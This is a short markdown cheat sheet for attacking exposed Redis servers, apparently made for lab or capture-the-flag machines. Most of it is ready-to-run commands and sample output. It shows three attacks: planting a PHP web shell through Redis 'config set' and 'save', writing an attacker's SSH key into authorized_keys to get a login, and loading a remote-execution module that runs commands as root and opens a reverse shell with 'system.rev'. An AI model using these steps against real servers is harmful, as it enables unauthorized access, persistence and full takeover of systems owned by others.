# Redis
------------
port 6379 TCP
```bash
sudo apt install redis-cli
```

```bash
redis-cli -h 10.10.10.10
```

```bash
> ping
> PONG
```


## PHP Web Shell
When we know the root folder of the php web server running:
```bash
> config set dir /var/www/html
> config set dbfilename redis.php
> set test "<?php phpinfo(); ?>"
> save
```


## Dropping SSH keys for Access
redis-cli:
```bash
config get dir
1) "dir"
2) "/var/lib/redis"

config set dir ./.ssh
OK

config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```

Once this is done we should be able to write ssh keys into .ssh folder.
Generate keys using ssh-keygen. 

Add some extra newlines before & after the public key:
```bash
(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > key.txt
``` 

Push this key into redis instance using redis cli from stdin:
```bash
cat key.txt | redis-cli -h 10.10.10.160 -x set cbbn
```

Telling redis that the dbname is authorized_keys and save:
redis-cli:
```bash
config set dbfilename "authorized_keys"
OK
save
```

Now ssh into the machine using the id_rsa:
```bash
ssh -i id_rsa redis@10.10.10.160
````



## Redis module RCE
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
Clone the repo, make and the shared object module will be saved in the src folder as module.so 
Find a way to upload the module.so into the victim pc; once uploaded load the module:
```bash
MODULE LOAD /path/to/mymodule.so
# check loaded module:
MODULE LIST
# unload module
MODULE UNLOAD mymodule
```

now execute commands:
```bash
127.0.0.1:6379> system.exec "id"
"uid=0(root) gid=0(root) groups=0(root)\n"
127.0.0.1:6379> system.exec "whoami"
"root\n"
127.0.0.1:6379> system.rev 127.0.0.1 9999
```


-----------







